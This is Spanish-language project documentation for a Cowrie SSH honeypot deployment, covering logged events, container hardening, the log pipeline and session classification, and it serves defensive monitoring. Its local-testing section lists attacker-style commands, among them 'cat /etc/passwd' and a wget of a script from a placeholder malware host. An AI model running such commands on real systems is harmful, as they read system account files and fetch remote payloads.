---
title: SSH Honeypot (Cowrie)
description: Como funciona Cowrie, que captura y como esta configurado en el proyecto.
---

[Cowrie](https://github.com/cowrie/cowrie) es un honeypot SSH y Telnet de media interaccion. Simula un shell Linux real — los atacantes creen que tienen acceso a un servidor genuino, pero cada accion que realizan queda registrada sin afectar ningun sistema real.

## Que captura

Cowrie registra en `cowrie.json` todos los eventos del protocolo SSH:

| Tipo de evento | Descripcion |
|---------------|-------------|
| `cowrie.session.connect` | Conexion TCP establecida con IP y puerto del atacante |
| `cowrie.login.failed` | Intento de login fallido (usuario + contrasena probados) |
| `cowrie.login.success` | Login exitoso (Cowrie acepta cualquier credencial configurada) |
| `cowrie.command.input` | Comando ejecutado en el shell falso |
| `cowrie.command.failed` | Comando no reconocido por el shell simulado |
| `cowrie.session.file_download` | Intento de descarga de archivo (wget, curl, tftp) |
| `cowrie.session.closed` | Cierre de sesion con duracion total |

## Como funciona el shell simulado

Cowrie implementa un interprete de comandos que responde de forma plausible a los comandos mas comunes (`ls`, `pwd`, `cat`, `wget`, `curl`, `uname`, `id`, `whoami`, etc.). El filesystem es una copia de un sistema Debian tipico. Los archivos que el atacante "descarga" no se ejecutan realmente.

## Configuracion en el proyecto

En desarrollo, Cowrie escucha en el puerto `2222` del host (mapeado a `2222` del contenedor). En produccion, el puerto `22` del host se mapea al puerto `2222` del contenedor — Cowrie siempre escucha en `2222` internamente.

```yaml
# docker-compose.prod.single-host.yml
cowrie:
  image: cowrie/cowrie:latest
  ports:
    - "22:2222"      # prod: el puerto 22 real va a Cowrie
  networks:
    - edge           # solo red edge, sin acceso a la app
  pids_limit: 256
  security_opt:
    - no-new-privileges:true
  cap_drop:
    - ALL
```

## Flujo de logs hacia ingest-api

Los eventos se escriben en `cowrie.json` dentro del volumen `cowrie_var`. El `log-puller` lee ese archivo y los envia a `ingest-api`.

```
Cowrie escribe ──▶ cowrie_var:/cowrie/cowrie-git/var/log/cowrie/cowrie.json
                                    │
                              log-puller (lee cada 3s)
                                    │
                           POST /ingest/cowrie/batch
                                    │
                              ingest-api ──▶ postgres
```

## Clasificacion automatica de sesiones

El dashboard clasifica cada sesion de Cowrie segun el numero de eventos y si el login fue exitoso:

| Clasificacion | Condicion | Descripcion |
|---------------|-----------|-------------|
| Scanner | No logueado, ≤3 eventos | Solo sondeo de puerto |
| Bot scan | No logueado, 8–30 eventos | Intento multiple de credenciales |
| Brute-force | No logueado, >30 eventos | Ataque de fuerza bruta intenso |
| Login only | Logueado, ≤8 eventos | Acceso exitoso sin actividad post-login |
| Recon | Logueado, 8–20 eventos | Reconocimiento basico tras acceso |
| Interactive | Logueado, 20–40 eventos | Sesion interactiva activa |
| Malware dropper | Logueado, >40 eventos | Actividad extensa, posible descarga de malware |

## Probar Cowrie localmente

```bash
# Conectate al honeypot (acepta cualquier password)
ssh -p 2222 root@localhost

# Dentro del shell falso:
whoami
ls -la
cat /etc/passwd
uname -a
wget http://malware.example.com/bot.sh
```

Cada comando que ejecutes aparecera en el dashboard bajo Sessions.
